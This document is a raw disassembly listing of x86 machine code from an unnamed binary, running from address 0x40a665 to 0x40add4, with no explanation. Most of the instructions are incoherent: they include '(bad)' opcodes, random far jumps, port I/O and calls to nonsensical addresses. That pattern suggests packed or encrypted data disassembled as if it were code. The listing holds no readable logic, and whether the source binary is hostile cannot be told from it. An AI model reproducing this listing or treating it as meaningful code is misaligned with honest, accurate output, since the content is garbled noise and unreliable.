  40a665:	jns    0x40a625
  40a667:	ret    
  40a668:	out    dx,eax
  40a669:	cmp    DWORD PTR [ebx+0x6e45aeeb],ebx
  40a66f:	adc    al,BYTE PTR [edx+0x5e]
  40a672:	add    eax,0xcc516d03
  40a677:	call   0x83431e89
  40a67c:	mov    ch,BYTE PTR [eax]
  40a67e:	cmp    DWORD PTR [ecx],0x9a127b6b
  40a684:	(bad)  
  40a685:	jl     0x40a6c8
  40a687:	pusha  
  40a688:	or     edi,edi
  40a68a:	adc    al,0x74
  40a68c:	outs   dx,DWORD PTR ds:[esi]
  40a68d:	loopne 0x40a6e4
  40a68f:	or     BYTE PTR [esp+ecx*4],ch
  40a692:	jmp    0x4d76:0xbbde3153
  40a699:	and    BYTE PTR [ebp+0x4031b4a1],dh
  40a69f:	sti    
  40a6a0:	mov    ecx,0xccea5529
  40a6a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6a6:	adc    ax,0x90b
  40a6aa:	pop    edi
  40a6ab:	(bad)  [ecx+ecx*8+0x28]
  40a6af:	jecxz  0x40a6cb
  40a6b1:	jno    0x40a716
  40a6b3:	adc    BYTE PTR [ecx],0x5d
  40a6b6:	add    BYTE PTR [eax+0x5d1ceeb1],ch
  40a6bc:	push   0xfed3ae81
  40a6c1:	stos   BYTE PTR es:[edi],al
  40a6c2:	push   0x3c3f4984
  40a6c7:	leave  
  40a6c8:	in     al,dx
  40a6c9:	loop   0x40a67c
  40a6cb:	sub    eax,0xa640a14
  40a6d0:	(bad)  
  40a6d1:	push   cs
  40a6d2:	stos   DWORD PTR es:[edi],eax
  40a6d3:	sub    edx,ecx
  40a6d5:	(bad)  [eax-0x3be8f189]
  40a6db:	out    dx,eax
  40a6dc:	das    
  40a6dd:	mov    ds:0x26578187,al
  40a6e2:	(bad)  
  40a6e3:	cs xchg ch,dl
  40a6e6:	sub    BYTE PTR [edx-0x2f],0xdd
  40a6ea:	out    dx,eax
  40a6eb:	sbb    bl,BYTE PTR [ebx]
  40a6ed:	and    BYTE PTR [esi-0x2644bff4],0xdc
  40a6f4:	mov    ds:0x9115517a,eax
  40a6f9:	xor    esi,DWORD PTR [ecx]
  40a6fb:	in     al,0xef
  40a6fd:	cwde   
  40a6fe:	and    bl,BYTE PTR [ecx]
  40a700:	sahf   
  40a701:	add    BYTE PTR [ecx],bl
  40a703:	jmp    0x40a6f3
  40a705:	xchg   bx,ax
  40a707:	xchg   edi,eax
  40a708:	jge    0x40a6ad
  40a70a:	pop    es
  40a70b:	adc    edx,DWORD PTR [edi+0x55b68298]
  40a711:	mov    ebp,0x24bf590c
  40a716:	call   0xbae37925
  40a71b:	test   BYTE PTR [edi+edi*1],bl
  40a71e:	adc    ch,BYTE PTR [edi-0x58]
  40a721:	dec    ecx
  40a722:	iret   
  40a723:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a724:	enter  0x47c7,0x3e
  40a728:	dec    ebx
  40a729:	and    esp,ebp
  40a72b:	stc    
  40a72c:	ds pop ebp
  40a72e:	ret    
  40a72f:	xchg   ebx,eax
  40a730:	out    0x6c,eax
  40a732:	loop   0x40a727
  40a734:	xchg   edi,eax
  40a735:	shl    BYTE PTR [eax-0x621d337d],0x7e
  40a73c:	and    ch,cl
  40a73e:	retf   0xb9b8
  40a741:	enter  0x90ad,0xc5
  40a745:	or     DWORD PTR [eax+0x6],edx
  40a748:	push   ax
  40a74a:	dec    ecx
  40a74b:	cmp    BYTE PTR [edi],cl
  40a74d:	int3   
  40a74e:	popf   
  40a74f:	cmc    
  40a750:	data16 mov bl,0x92
  40a753:	leave  
  40a754:	mov    ds:0xdb96205b,eax
  40a759:	xchg   esi,eax
  40a75a:	and    DWORD PTR [ecx-0x9901450],edi
  40a760:	xor    DWORD PTR [edi+0x12020b19],esi
  40a766:	inc    edi
  40a767:	mov    eax,0x8c477162
  40a76c:	cwde   
  40a76d:	mov    cs:0x10426e1f,al
  40a773:	test   BYTE PTR [ebx+0x33],dh
  40a776:	or     cl,0x21
  40a779:	mov    al,ds:0xe8f1c95c
  40a77e:	pop    es
  40a77f:	and    ah,BYTE PTR [edx]
  40a781:	mov    ss,WORD PTR [edx+ebp*8-0x448f6889]
  40a788:	xchg   ebx,eax
  40a789:	das    
  40a78a:	test   esi,edi
  40a78c:	mov    esp,0x251bad90
  40a791:	div    BYTE PTR [edi+eiz*1-0x540010]
  40a798:	mov    eax,ds:0xca0b839f
  40a79d:	int    0xb4
  40a79f:	xchg   BYTE PTR [ebx+edx*4+0x10],cl
  40a7a3:	(bad)  
  40a7a4:	dec    DWORD PTR [edi-0x37559238]
  40a7aa:	cmc    
  40a7ab:	xchg   edi,eax
  40a7ac:	or     al,0xf
  40a7ae:	data16 lahf 
  40a7b0:	mov    ch,0x39
  40a7b2:	dec    esi
  40a7b3:	mul    DWORD PTR [esi]
  40a7b5:	mov    ds:0x83dfb90d,eax
  40a7ba:	ss mov dh,0x47
  40a7bd:	sub    al,0x17
  40a7bf:	push   edi
  40a7c0:	enter  0x9b8c,0x4b
  40a7c4:	fdivp  st(0),st
  40a7c6:	(bad)  
  40a7c7:	dec    ecx
  40a7c8:	(bad)  
  40a7c9:	pop    edx
  40a7ca:	push   0x24
  40a7cc:	xchg   ecx,eax
  40a7cd:	wrssd  [ebx-0x15],eax
  40a7d2:	cmp    DWORD PTR [ecx+0x39],esp
  40a7d5:	push   ebp
  40a7d6:	adc    BYTE PTR [ebp+0xbc55201],dh
  40a7dc:	lods   al,BYTE PTR ds:[esi]
  40a7dd:	xchg   ecx,eax
  40a7de:	adc    eax,0xf3d71f46
  40a7e3:	mov    al,ds:0xed1ea3a9
  40a7e8:	mov    DWORD PTR [edx+eax*8],esi
  40a7eb:	les    edx,FWORD PTR [ebp-0x635ca74]
  40a7f1:	out    0x2d,eax
  40a7f3:	pop    ss
  40a7f4:	adc    dh,BYTE PTR [edi+0x2bbb320f]
  40a7fa:	aas    
  40a7fb:	adc    al,0x4e
  40a7fd:	pushf  
  40a7fe:	dec    esi
  40a7ff:	xchg   ecx,eax
  40a800:	mov    edx,0xce0af3f3
  40a805:	lods   al,BYTE PTR ds:[esi]
  40a806:	rcl    DWORD PTR [eax],cl
  40a808:	imul   eax,ecx,0xffffffe7
  40a80b:	ss loope 0x40a796
  40a80e:	pusha  
  40a80f:	jecxz  0x40a806
  40a811:	jmp    0xb0f9592b
  40a816:	adc    esp,edx
  40a818:	jg     0x40a806
  40a81a:	cmp    DWORD PTR [ecx+0x4f],eax
  40a81d:	mov    bh,0xa1
  40a81f:	pushf  
  40a820:	jno    0x40a895
  40a822:	push   ebp
  40a823:	or     BYTE PTR [ecx+eiz*1],al
  40a826:	pop    edi
  40a827:	mov    ah,0x74
  40a829:	xchg   ebx,eax
  40a82a:	or     DWORD PTR [esi+0x2f],esp
  40a82d:	cwde   
  40a82e:	out    0xb6,eax
  40a830:	mov    esp,0xe06175cd
  40a835:	cmp    ah,BYTE PTR [edx-0x37e8ae5c]
  40a83b:	jns    0x40a7e9
  40a83d:	mov    ds:0x55c12a09,al
  40a842:	inc    eax
  40a843:	or     eax,0x61ce454e
  40a848:	jge    0x40a88f
  40a84a:	mov    ch,0xa9
  40a84c:	jne    0x40a7d7
  40a84e:	add    DWORD PTR [edx+0x57f1ea3],esi
  40a854:	sahf   
  40a855:	shr    DWORD PTR ds:0x1d1709a,1
  40a85b:	leave  
  40a85c:	mov    al,ds:0x5d3f0510
  40a861:	out    dx,eax
  40a862:	mov    dh,0xab
  40a864:	fwait
  40a865:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a866:	inc    eax
  40a867:	int3   
  40a868:	std    
  40a869:	test   BYTE PTR [ebx+0x27],bh
  40a86c:	jo     0x40a8e0
  40a86e:	jnp    0x40a85b
  40a870:	xor    eax,0x3ea555a0
  40a875:	jge    0x40a83e
  40a877:	mov    edx,0x9efc601e
  40a87c:	fstp   DWORD PTR [esi-0x15]
  40a87f:	neg    BYTE PTR [ebx+0x100588df]
  40a885:	push   esp
  40a886:	pop    ss
  40a887:	mov    edi,0x739fb14b
  40a88c:	dec    esp
  40a88d:	ds in  eax,0x84
  40a890:	js     0x40a8e6
  40a892:	xor    esp,DWORD PTR [esi+0x6a]
  40a895:	aaa    
  40a896:	dec    edx
  40a897:	out    dx,al
  40a898:	lock or BYTE PTR [edi-0x32],0xe4
  40a89d:	imul   eax,DWORD PTR [ecx+0x5e],0x88aeb455
  40a8a4:	(bad)  
  40a8a5:	std    
  40a8a6:	loopne 0x40a874
  40a8a8:	push   esp
  40a8a9:	mov    bh,0xb8
  40a8ab:	fstp   QWORD PTR [ebp+0x53a97505]
  40a8b1:	pop    ds
  40a8b2:	or     BYTE PTR [ebp+0x7a],ch
  40a8b5:	sbb    eax,0x58a3c949
  40a8ba:	pop    esp
  40a8bb:	add    bl,BYTE PTR [ebx+0x65a78334]
  40a8c1:	je     0x40a8f5
  40a8c3:	or     BYTE PTR [esi+ebp*2-0x67244bec],ch
  40a8ca:	and    al,BYTE PTR [esi+0x4485a0bc]
  40a8d0:	xor    ebx,DWORD PTR [esi+0x32]
  40a8d3:	jne    0x40a938
  40a8d5:	or     eax,0xe03a5e0f
  40a8da:	pushf  
  40a8db:	retf   0x5bb8
  40a8de:	pop    eax
  40a8df:	mov    edx,DWORD PTR [edx-0x8db0a65]
  40a8e5:	adc    cl,BYTE PTR [ecx+0x6]
  40a8e8:	scas   al,BYTE PTR es:[edi]
  40a8e9:	and    BYTE PTR [edx-0x7e75ebae],al
  40a8ef:	dec    ebx
  40a8f0:	jge    0x40a957
  40a8f2:	or     BYTE PTR [ebx],bl
  40a8f4:	jne    0x40a943
  40a8f6:	mov    ah,0xf9
  40a8f8:	pop    esp
  40a8f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8fa:	stos   BYTE PTR es:[edi],al
  40a8fb:	jne    0x40a8bd
  40a8fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8fe:	xchg   esp,eax
  40a8ff:	stos   BYTE PTR es:[edi],al
  40a900:	(bad)  
  40a901:	out    0x33,eax
  40a903:	add    BYTE PTR [ebx+eax*4-0x7939157c],dh
  40a90a:	jge    0x40a942
  40a90c:	sbb    bh,bl
  40a90e:	sub    BYTE PTR [esi-0x7c1e52ab],bh
  40a914:	into   
  40a915:	sbb    BYTE PTR [ecx],al
  40a917:	jb     0x40a8ed
  40a919:	adc    ch,dh
  40a91b:	cvtps2pd xmm6,QWORD PTR [ecx-0x38]
  40a91f:	sbb    DWORD PTR [ebx],edx
  40a921:	shr    BYTE PTR [edx-0x49],cl
  40a924:	xchg   ebp,eax
  40a925:	out    0xef,al
  40a927:	jbe    0x40a952
  40a929:	sub    edi,DWORD PTR [edi]
  40a92b:	mov    ecx,ecx
  40a92d:	add    ebp,DWORD PTR [ebp-0x216a746d]
  40a933:	inc    esi
  40a934:	cwde   
  40a935:	dec    eax
  40a936:	arpl   WORD PTR [edx+0x24],cx
  40a939:	mov    cs,WORD PTR [esi+0x32]
  40a93c:	call   0xbadea78f
  40a941:	jbe    0x40a938
  40a943:	xor    eax,0xca7163fa
  40a948:	pop    ecx
  40a949:	fild   DWORD PTR [ebp+ecx*1-0x29]
  40a94d:	scas   eax,DWORD PTR es:[edi]
  40a94e:	ret    
  40a94f:	int3   
  40a950:	cwde   
  40a951:	mov    ds:0x8ecfc525,eax
  40a956:	fild   QWORD PTR [esi]
  40a958:	mov    dl,0xbd
  40a95a:	or     al,0x3d
  40a95c:	test   DWORD PTR [esi-0x255ea5b8],ebp
  40a962:	xchg   esp,eax
  40a963:	rcl    ebx,1
  40a965:	fs popf 
  40a967:	out    dx,eax
  40a968:	xchg   BYTE PTR [esp+ebp*4-0x47a97422],ah
  40a96f:	hlt    
  40a970:	in     al,dx
  40a971:	out    dx,al
  40a972:	lods   al,BYTE PTR ds:[esi]
  40a973:	dec    edi
  40a974:	sub    al,0xdf
  40a976:	sub    al,0xfa
  40a978:	push   eax
  40a979:	(bad)  
  40a97a:	pop    ss
  40a97b:	mov    ebx,0x1f5eb315
  40a980:	pop    ss
  40a981:	dec    edi
  40a982:	adc    DWORD PTR [esi+eax*4],ebp
  40a985:	mov    edi,0x885a8b4a
  40a98a:	sub    ecx,DWORD PTR [ebp-0x155129a5]
  40a990:	ins    DWORD PTR es:[edi],dx
  40a991:	dec    esi
  40a992:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a993:	jmp    DWORD PTR [edx+0x27]
  40a996:	adc    al,0x79
  40a998:	cwde   
  40a999:	fs add eax,0x3bc64988
  40a99f:	mov    dl,0xfb
  40a9a1:	test   eax,0xa6a7ee42
  40a9a6:	push   eax
  40a9a7:	fadd   DWORD PTR [bp-0x6e]
  40a9ab:	out    0xab,al
  40a9ad:	dec    ebx
  40a9ae:	and    cl,BYTE PTR [eax]
  40a9b0:	mov    al,0x44
  40a9b2:	shl    dh,1
  40a9b4:	enter  0xea63,0xe4
  40a9b8:	mov    ds:0xca938200,eax
  40a9bd:	icebp  
  40a9be:	(bad)  
  40a9bf:	cmp    al,0x7c
  40a9c1:	push   ebp
  40a9c2:	ins    DWORD PTR es:[edi],dx
  40a9c3:	sub    al,BYTE PTR [esp+edi*2-0x66]
  40a9c7:	dec    edi
  40a9c8:	and    BYTE PTR [edi],bl
  40a9ca:	and    al,0x78
  40a9cd:	mov    bh,0x6d
  40a9cf:	xor    DWORD PTR [edx+0x1b83a679],ebp
  40a9d5:	cwde   
  40a9d6:	imul   edx,esi,0x3ff4561c
  40a9dc:	aad    0x5c
  40a9de:	cmp    dh,BYTE PTR [edi-0x384d693f]
  40a9e4:	mov    ds:0x3a98ec78,al
  40a9e9:	xchg   ebx,eax
  40a9ea:	push   0xa372fb27
  40a9ef:	pusha  
  40a9f0:	rcr    BYTE PTR [edi-0x49064530],0x45
  40a9f7:	pop    edx
  40a9f8:	loopne 0x40aa04
  40a9fa:	or     al,0x91
  40a9fc:	ja     0x40a9f0
  40a9fe:	ffreep st(3)
  40aa00:	out    0x13,al
  40aa02:	mov    esi,0x219dc74a
  40aa07:	sub    eax,0x75d3f34
  40aa0c:	test   ax,0x6275
  40aa10:	pop    ecx
  40aa11:	xchg   esp,eax
  40aa12:	pop    ebp
  40aa13:	and    DWORD PTR [edi+0x1b],esp
  40aa16:	push   edx
  40aa17:	ret    0x4677
  40aa1a:	sbb    eax,0x6af2d486
  40aa1f:	cld    
  40aa20:	jmp    0x90e0:0xf50e700d
  40aa27:	aaa    
  40aa28:	mov    es,edx
  40aa2a:	or     eax,0x45a1d6cd
  40aa2f:	push   ds
  40aa30:	fcom   QWORD PTR [ebp+eax*2-0x3a88eae4]
  40aa37:	imul   ebx,edi,0x7c
  40aa3a:	inc    edx
  40aa3b:	mov    ds:0xcd9f590c,eax
  40aa40:	cli    
  40aa41:	and    DWORD PTR [ebx+0x7a],esp
  40aa44:	or     DWORD PTR [edi],0x288d4db0
  40aa4a:	add    DWORD PTR ss:[ecx-0xcc152c6],0xf2d4f532
  40aa55:	mov    BYTE PTR [ebp+0x6537f23a],ah
  40aa5b:	jmp    0xe891:0x756cb49f
  40aa62:	add    al,0x37
  40aa64:	stos   BYTE PTR es:[edi],al
  40aa65:	add    bl,ch
  40aa67:	pop    ds
  40aa68:	sub    dh,BYTE PTR [esi-0x1d465d30]
  40aa6e:	nop
  40aa6f:	fisubr WORD PTR [esp+ebp*2]
  40aa72:	jge    0x40aa91
  40aa74:	les    ebp,FWORD PTR [edx]
  40aa76:	loopne 0x40aa08
  40aa78:	xor    BYTE PTR [ecx+0x3d],cl
  40aa7b:	imul   esi,DWORD PTR ds:0x81acc717,0x94d122b7
  40aa85:	out    0xa,eax
  40aa87:	jbe    0x40aa37
  40aa89:	cwde   
  40aa8a:	scas   al,BYTE PTR es:[edi]
  40aa8b:	mov    edx,0x4db6afd5
  40aa90:	ss sti 
  40aa92:	(bad)  
  40aa94:	mov    edi,0x5b16ce48
  40aa99:	js     0x40aa7b
  40aa9b:	sbb    al,0xd1
  40aa9d:	fcmovnbe st,st(2)
  40aa9f:	(bad)  
  40aaa0:	jns    0x40ab08
  40aaa2:	es xchg ebp,eax
  40aaa4:	(bad)  
  40aaa6:	cmp    BYTE PTR [ecx+0x2],ch
  40aaa9:	or     edx,DWORD PTR [esi]
  40aaab:	xchg   edx,eax
  40aaac:	xor    dl,0x57
  40aaaf:	lods   al,BYTE PTR ds:[esi]
  40aab0:	xor    eax,0x387e0639
  40aab5:	push   ds
  40aab6:	ja     0x40aab5
  40aab8:	aam    0x63
  40aaba:	retf   0x808a
  40aabd:	push   ds
  40aabe:	sbb    ah,ch
  40aac0:	and    eax,0xffffffd2
  40aac3:	mov    ah,0xe8
  40aac5:	push   esp
  40aac6:	repz jo 0x40aae7
  40aac9:	cld    
  40aaca:	nop
  40aacb:	nop
  40aacc:	loop   0x40aa51
  40aace:	lahf   
  40aacf:	push   edi
  40aad0:	icebp  
  40aad1:	clc    
  40aad2:	mov    al,0xdd
  40aad4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aad5:	cli    
  40aad6:	xor    BYTE PTR [esi-0x23],bl
  40aad9:	mov    WORD PTR [edx+eax*2-0x249a1afc],fs
  40aae0:	rol    DWORD PTR [ecx],cl
  40aae2:	jns    0x40aa9b
  40aae4:	sbb    eax,ebp
  40aae6:	push   0x949458dc
  40aaeb:	cdq    
  40aaec:	xchg   ebp,eax
  40aaed:	cmp    ah,BYTE PTR [edi-0x361fff12]
  40aaf3:	cdq    
  40aaf4:	test   DWORD PTR [eax],esi
  40aaf6:	mov    ds:0x9dd2c5ce,eax
  40aafb:	jne    0x40aaf7
  40aafd:	(bad)  
  40aafe:	xor    DWORD PTR [ebp+eax*8-0x39c54d65],edi
  40ab05:	(bad)  
  40ab06:	retf   
  40ab07:	outs   dx,DWORD PTR ds:[esi]
  40ab08:	xor    eax,0xcb66f470
  40ab0d:	sbb    al,0x1a
  40ab0f:	fcom   st(1)
  40ab11:	xchg   DWORD PTR [edi+0x53],edx
  40ab14:	lahf   
  40ab15:	add    DWORD PTR [edi+ebp*8-0x2bb949d4],ebx
  40ab1c:	dec    esi
  40ab1d:	pop    ecx
  40ab1f:	ins    BYTE PTR es:[edi],dx
  40ab20:	adc    dh,BYTE PTR [edx]
  40ab22:	enter  0xa2e5,0x1c
  40ab26:	cld    
  40ab27:	or     eax,0xa0e1d563
  40ab2c:	loop   0x40aac3
  40ab2e:	adc    eax,0x6f04fe16
  40ab33:	or     eax,0x8fbc6686
  40ab38:	adc    DWORD PTR [esi],esi
  40ab3a:	jl     0x40ab8f
  40ab3c:	mov    bl,0x8d
  40ab3e:	mov    bl,0x44
  40ab40:	nop
  40ab41:	(bad)  
  40ab43:	ds cs sahf 
  40ab46:	sbb    dl,BYTE PTR ds:0x2b5a1764
  40ab4c:	pop    edx
  40ab4d:	jae    0x40ab03
  40ab4f:	cmc    
  40ab50:	aam    0x7d
  40ab52:	inc    edx
  40ab53:	or     bl,al
  40ab55:	in     eax,dx
  40ab56:	imul   ebx,DWORD PTR [ecx+0x31],0x7b
  40ab5a:	je     0x40ab3e
  40ab5c:	inc    edx
  40ab5d:	push   cs
  40ab5e:	mov    ebp,DWORD PTR [esi+esi*4]
  40ab61:	js     0x40ab3c
  40ab63:	sub    al,0x4
  40ab65:	cmovl  ebx,DWORD PTR [eax-0x75]
  40ab69:	cld    
  40ab6a:	rcr    DWORD PTR [ecx+edx*1-0x7],1
  40ab6e:	push   ds
  40ab6f:	das    
  40ab70:	push   0xffffff96
  40ab72:	outs   dx,DWORD PTR ds:[esi]
  40ab73:	repnz mov ecx,0x49223430
  40ab79:	cmp    eax,0x8fa342fa
  40ab7e:	enter  0xa7a5,0xe1
  40ab82:	shr    DWORD PTR [ebp-0x40],1
  40ab85:	mov    ch,0xc6
  40ab87:	or     al,0x27
  40ab89:	jecxz  0x40aba2
  40ab8b:	std    
  40ab8c:	sub    al,BYTE PTR [ebp-0x75]
  40ab8f:	shl    bh,1
  40ab91:	pushf  
  40ab92:	add    DWORD PTR [eax+ebx*1],edi
  40ab95:	jns    0x40abca
  40ab97:	aad    0xf1
  40ab99:	push   esi
  40ab9a:	mov    edi,0x16f1561
  40ab9f:	imul   edi,esi,0xffffffb4
  40aba2:	aam    0x8d
  40aba4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aba5:	mov    ah,0x81
  40aba7:	ss out 0xbe,al
  40abaa:	dec    ecx
  40abab:	inc    edi
  40abac:	dec    ebx
  40abad:	dec    edx
  40abae:	xchg   ebp,eax
  40abaf:	jg     0x40aba4
  40abb1:	push   ebx
  40abb2:	retf   
  40abb3:	sbb    eax,0xea46cc16
  40abb8:	pusha  
  40abb9:	test   al,0x5e
  40abbb:	cmp    edi,esp
  40abbd:	xchg   edi,eax
  40abbe:	pusha  
  40abbf:	dec    edx
  40abc0:	lahf   
  40abc1:	cld    
  40abc2:	adc    al,0x7e
  40abc4:	pop    ebp
  40abc5:	jge    0x40abab
  40abc7:	jns    0x40abab
  40abc9:	sbb    esi,DWORD PTR [esi-0x10]
  40abcc:	push   ecx
  40abcd:	ret    
  40abce:	ror    DWORD PTR [esi],1
  40abd0:	or     DWORD PTR [edx+0x1f668cac],esi
  40abd6:	mov    eax,0x553c5832
  40abdb:	xor    al,0x6a
  40abdd:	gs out dx,eax
  40abdf:	lds    ecx,FWORD PTR [eax-0x6b]
  40abe2:	ins    BYTE PTR es:[edi],dx
  40abe3:	outs   dx,DWORD PTR ds:[esi]
  40abe4:	(bad)  
  40abe5:	adc    eax,0x2ce1303e
  40abea:	jmp    0x40abd7
  40abec:	hlt    
  40abed:	ret    
  40abee:	inc    edi
  40abef:	inc    edi
  40abf0:	mov    bl,0xf0
  40abf2:	inc    eax
  40abf3:	enter  0x3e86,0x33
  40abf7:	pop    esi
  40abf8:	add    al,0x64
  40abfa:	mov    ?,edi
  40abfc:	bound  edi,QWORD PTR [edx-0x2bc1a7e2]
  40ac02:	sub    ebp,esi
  40ac04:	and    DWORD PTR [edx-0x10],ebp
  40ac07:	jecxz  0x40ac3f
  40ac09:	cs pop esi
  40ac0b:	pop    edx
  40ac0c:	stos   BYTE PTR es:[edi],al
  40ac0d:	mov    esi,0x7504222c
  40ac12:	pop    DWORD PTR [eax-0x22]
  40ac15:	pop    ds
  40ac16:	loope  0x40abbb
  40ac18:	xchg   ebx,eax
  40ac19:	cmp    bl,BYTE PTR [eax+ebp*1]
  40ac1c:	sar    dl,cl
  40ac1e:	and    bh,al
  40ac20:	nop
  40ac21:	jle    0x40ac39
  40ac23:	fs cdq 
  40ac25:	mov    bh,0x27
  40ac27:	outs   dx,BYTE PTR ds:[esi]
  40ac28:	es fdivr st(6),st
  40ac2b:	sub    DWORD PTR ds:0x143bb0c1,0x39a01b36
  40ac35:	je     0x40ac77
  40ac37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac38:	je     0x40ac88
  40ac3a:	or     eax,0xc5b9a651
  40ac3f:	dec    ebx
  40ac40:	jae    0x40ac15
  40ac42:	in     al,dx
  40ac43:	adc    BYTE PTR [esi+0x2b],0xad
  40ac47:	push   0x9
  40ac49:	not    edx
  40ac4b:	mov    esp,0x298b2631
  40ac50:	sub    DWORD PTR [eax],edi
  40ac52:	jl     0x40abf3
  40ac54:	or     dh,BYTE PTR [esp+ebx*8+0x5e]
  40ac58:	add    esi,esi
  40ac5a:	into   
  40ac5b:	jecxz  0x40acbd
  40ac5d:	push   es
  40ac5e:	xchg   edi,eax
  40ac5f:	jb     0x40ac49
  40ac61:	fcomp  QWORD PTR [ebp+0x23]
  40ac64:	and    al,0xe3
  40ac66:	sti    
  40ac67:	and    cl,BYTE PTR [edx]
  40ac69:	jbe    0x40ac96
  40ac6b:	push   cs
  40ac6c:	sub    DWORD PTR gs:[edx-0xd],0x25e40943
  40ac74:	sbb    eax,edi
  40ac76:	xchg   edx,eax
  40ac77:	cs add eax,0xc63f6528
  40ac7d:	adc    BYTE PTR [ebx],bl
  40ac7f:	push   eax
  40ac80:	mov    esp,0x62ee03e5
  40ac85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac86:	stc    
  40ac87:	mov    ss,ecx
  40ac89:	out    dx,eax
  40ac8a:	inc    eax
  40ac8b:	int    0x2b
  40ac8d:	outs   dx,DWORD PTR ds:[esi]
  40ac8e:	inc    edx
  40ac8f:	inc    edi
  40ac90:	rol    edx,1
  40ac92:	ret    0x27f1
  40ac95:	inc    eax
  40ac96:	inc    ebp
  40ac97:	pop    esi
  40ac98:	in     eax,0xa1
  40ac9a:	into   
  40ac9b:	sbb    eax,0x15dad8f0
  40aca0:	push   ds
  40aca1:	and    ebp,DWORD PTR [eax]
  40aca3:	jge    0x40acb9
  40aca5:	inc    eax
  40aca6:	arpl   WORD PTR [eax+0x32],sp
  40aca9:	mov    al,ds:0xe6080c02
  40acae:	out    dx,eax
  40acaf:	retf   0x6e70
  40acb2:	sbb    al,0x22
  40acb4:	int3   
  40acb5:	add    edx,DWORD PTR [ebx+ebx*2-0x2e]
  40acb9:	fmul   DWORD PTR [ebp+0x456c69c0]
  40acbf:	jecxz  0x40acb6
  40acc1:	push   edi
  40acc2:	shr    DWORD PTR [esp+esi*4],cl
  40acc5:	jg     0x40accb
  40acc7:	test   DWORD PTR [esi+ecx*1],ecx
  40acca:	sbb    al,0x4d
  40accc:	jb     0x40acb9
  40acce:	xor    al,0x2e
  40acd0:	lods   eax,DWORD PTR ds:[esi]
  40acd1:	fisttp WORD PTR [edi-0x33]
  40acd4:	adc    al,0x83
  40acd6:	adc    ah,ch
  40acd8:	in     al,0x70
  40acda:	(bad)  
  40acdb:	and    al,0x8f
  40acdd:	push   cs
  40acde:	inc    eax
  40acdf:	jmp    0x40ad5c
  40ace1:	push   esp
  40ace2:	das    
  40ace3:	push   0xf940dc76
  40ace8:	(bad)  
  40ace9:	outs   dx,DWORD PTR ds:[esi]
  40acea:	sbb    BYTE PTR [esi+0x7d762762],dh
  40acf0:	retf   
  40acf1:	dec    esp
  40acf2:	hlt    
  40acf3:	xor    al,0x94
  40acf5:	fst    QWORD PTR [ebp+edi*1+0x24c12740]
  40acfc:	and    BYTE PTR [edx+0x24],dh
  40acff:	push   0xfffffff5
  40ad01:	shl    BYTE PTR [esi+ebp*4],cl
  40ad04:	les    ebx,FWORD PTR [ecx]
  40ad06:	mov    ds:0x95f3fb7c,al
  40ad0b:	sbb    al,0x6d
  40ad0d:	push   0xffffff9e
  40ad0f:	fmul   st,st(7)
  40ad11:	jmp    0x5166:0x63003ba
  40ad18:	je     0x40ad78
  40ad1a:	es jmp ebp
  40ad1d:	fdiv   QWORD PTR [ecx+ecx*4-0x54]
  40ad21:	pop    ecx
  40ad22:	ins    DWORD PTR es:[edi],dx
  40ad23:	push   esp
  40ad24:	popf   
  40ad25:	cmp    esp,0x54
  40ad28:	ds unpckhps xmm3,xmm2
  40ad2c:	cmp    DWORD PTR [edi],0xffffff8e
  40ad2f:	xor    ebx,DWORD PTR [ebp+0x575a3839]
  40ad35:	popf   
  40ad36:	jl     0x40ace4
  40ad38:	scas   al,BYTE PTR es:[edi]
  40ad39:	dec    esi
  40ad3a:	ja     0x40adac
  40ad3c:	jmp    0x40ace3
  40ad3e:	test   eax,0x4683d3c7
  40ad43:	dec    esi
  40ad44:	jbe    0x40ad40
  40ad46:	jle    0x40ad6c
  40ad48:	and    BYTE PTR [ebx],dh
  40ad4a:	neg    BYTE PTR [ebx]
  40ad4c:	pop    ecx
  40ad4d:	xor    al,0x90
  40ad4f:	cld    
  40ad50:	add    bl,BYTE PTR [ecx-0x2223263c]
  40ad56:	popa   
  40ad57:	xchg   edx,eax
  40ad58:	call   0x937f:0x26d656f2
  40ad5f:	push   es
  40ad60:	fdivr  QWORD PTR [esi+ebp*8+0x32]
  40ad64:	data16 outs dx,BYTE PTR ds:[esi]
  40ad66:	in     al,dx
  40ad67:	shr    DWORD PTR [eax-0xe1a7bb6],cl
  40ad6d:	retf   
  40ad6e:	xchg   esp,eax
  40ad6f:	mov    dl,dh
  40ad71:	and    DWORD PTR [ebx+0x2c],esp
  40ad74:	jae    0x40ad6d
  40ad76:	pop    ds
  40ad77:	xor    DWORD PTR [edi-0x313e07b0],ebp
  40ad7d:	mul    cl
  40ad7f:	add    BYTE PTR [ebp+0x2a5a1f23],bh
  40ad85:	pusha  
  40ad86:	jns    0x40ad65
  40ad88:	in     eax,dx
  40ad89:	fs out dx,eax
  40ad8b:	mov    ds:0x7cc4d227,eax
  40ad90:	fcomp  DWORD PTR [eax+eiz*8]
  40ad93:	lahf   
  40ad94:	mov    bl,0xaa
  40ad96:	daa    
  40ad97:	cmp    eax,0xc5991f06
  40ad9c:	cmc    
  40ad9d:	cmp    al,0xc
  40ad9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ada0:	xor    al,0x76
  40ada2:	(bad)  
  40ada4:	mov    edi,0x81e58638
  40ada9:	add    edx,DWORD PTR [edi]
  40adab:	ja     0x40ae10
  40adad:	pop    ebx
  40adae:	mov    ah,0x32
  40adb0:	adc    al,0xb5
  40adb2:	jl     0x40ae33
  40adb4:	adc    ch,BYTE PTR ds:0x9e46bfe1
  40adba:	mov    edx,0x109d884f
  40adbf:	xchg   ebp,eax
  40adc0:	sbb    edi,DWORD PTR [eax+ecx*1+0x50002850]
  40adc7:	arpl   WORD PTR [esi-0x4c],sp
  40adca:	adc    eax,0xcc9d999a
  40adcf:	inc    ebx
  40add0:	popf   
  40add1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40add2:	aam    0xb1
  40add4:	pop    ebx
